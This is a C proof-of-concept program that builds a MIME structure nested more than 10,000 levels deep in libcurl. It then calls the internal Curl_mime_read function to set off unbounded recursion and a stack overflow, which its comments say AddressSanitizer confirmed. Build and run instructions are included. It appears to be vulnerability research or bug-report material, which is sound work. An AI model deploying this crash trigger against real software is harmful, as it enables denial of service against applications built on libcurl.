/*
 *
 * The MIME read functions are mutually recursive with no depth limit:
 *   Curl_mime_read -> readback_part -> read_part_content (MIMEKIND_MULTIPART)
 *   -> mime_subparts_read -> readback_part -> ... (repeats indefinitely)
 *
 * By creating 10000+ levels of nested multipart MIME structures, each level
 * adds stack frames for mime_subparts_read + read_part_content + readback_part.
 * At ~9500+ nesting levels this exhausts the default 8MB stack.
 *
 * Confirmed with AddressSanitizer: stack-overflow at mime.c:684
 * in readback_bytes, called from the recursive chain.
 *
 * Build:
 *   clang -fsanitize=address -g poc_sf12.c \
 *     -I/path/to/curl/include /path/to/libcurl.a \
 *     -lssl -lcrypto -lz -o poc_sf12
 *
 * Run:
 *   ASAN_OPTIONS=detect_leaks=0 ./poc_sf12 10000
 */

#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* External declaration for Curl_mime_read (exported symbol) */
extern size_t Curl_mime_read(char *buffer, size_t size, size_t nitems, void *instream);

int main(int argc, char **argv) {
    int depth = argc > 1 ? atoi(argv[1]) : 10000;

    fprintf(stderr, "[SF12] Building %d-deep nested multipart MIME structure\n", depth);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if(!curl) {
        fprintf(stderr, "curl_easy_init failed\n");
        return 1;
    }

    /* Build innermost MIME with data */
    curl_mime *prev = curl_mime_init(curl);
    if(!prev) {
        fprintf(stderr, "curl_mime_init failed\n");
        curl_easy_cleanup(curl);
        return 1;
    }
    curl_mimepart *leaf = curl_mime_addpart(prev);
    curl_mime_data(leaf, "leaf_data", CURL_ZERO_TERMINATED);

    /* Nest depth levels deep: each level wraps previous mime as a subpart */
    for(int i = 0; i < depth; i++) {
        curl_mime *outer = curl_mime_init(curl);
        if(!outer) {
            fprintf(stderr, "OOM at depth %d\n", i);
            break;
        }
        curl_mimepart *p = curl_mime_addpart(outer);
        CURLcode rc = curl_mime_subparts(p, prev);
        if(rc != CURLE_OK) {
            fprintf(stderr, "curl_mime_subparts failed at depth %d: %s\n",
                    i, curl_easy_strerror(rc));
            curl_mime_free(outer);
            break;
        }
        prev = outer;
    }

    fprintf(stderr, "[SF12] Nested structure ready. Triggering MIME read...\n");

    /*
     * Create a top-level wrapper part and call Curl_mime_read.
     * This triggers the recursive chain:
     *   Curl_mime_read -> readback_part -> read_part_content (MIMEKIND_MULTIPART)
     *   -> mime_subparts_read -> readback_part -> ... (depth times)
     */
    curl_mime *top = curl_mime_init(curl);
    curl_mimepart *top_part = curl_mime_addpart(top);
    curl_mime_subparts(top_part, prev);

    char buf[8192];
    size_t n;
    size_t total = 0;
    int iter = 0;

    /* This will trigger the recursive read chain and stack-overflow at ~9500+ depth */
    while((n = Curl_mime_read(buf, 1, sizeof(buf), top_part)) > 0) {
        total += n;
        if(++iter > 100000) break;
    }

    fprintf(stderr, "[SF12] Read %zu bytes (n=%zu) - no crash at this depth\n", total, n);

    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
